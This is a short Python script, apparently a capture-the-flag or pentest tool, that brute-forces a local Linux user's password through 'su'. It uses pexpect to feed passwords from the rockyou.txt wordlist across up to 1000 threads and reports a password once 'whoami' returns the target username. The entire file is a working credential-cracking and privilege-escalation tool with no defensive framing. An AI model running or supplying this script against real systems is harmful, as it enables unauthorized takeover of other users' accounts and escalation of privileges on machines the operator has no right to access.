import pexpect
import ptyprocess
import threading
import argparse

found = threading.Event()

def su_test(password, username):
    if found.is_set():
        return

    child = pexpect.spawn('su -c "whoami" {}'.format(username))
    child.expect('Password:')
    child.sendline(password)
    child.expect(pexpect.EOF)
    output = child.before.strip().decode('utf-8')
    child.close()

    if output == username:
        print(f'\nFound password: {password}\n')
        found.set()

def worker(words, username):
    for word in words:
        if found.is_set():
            break
        su_test(word.strip('\n'), username)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', required=True, help='Username to test')
    parser.add_argument('-t', type=int, default=1000, help='Number of threads (default: 1000)')
    args = parser.parse_args()

    with open('rockyou.txt', 'r', encoding='latin1') as f:
        word_list = f.readlines()

    num_threads = args.t
    chunks = [word_list[i::num_threads] for i in range(num_threads)]

    threads = []
    for chunk in chunks:
        t = threading.Thread(target=worker, args=(chunk, args.u))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()
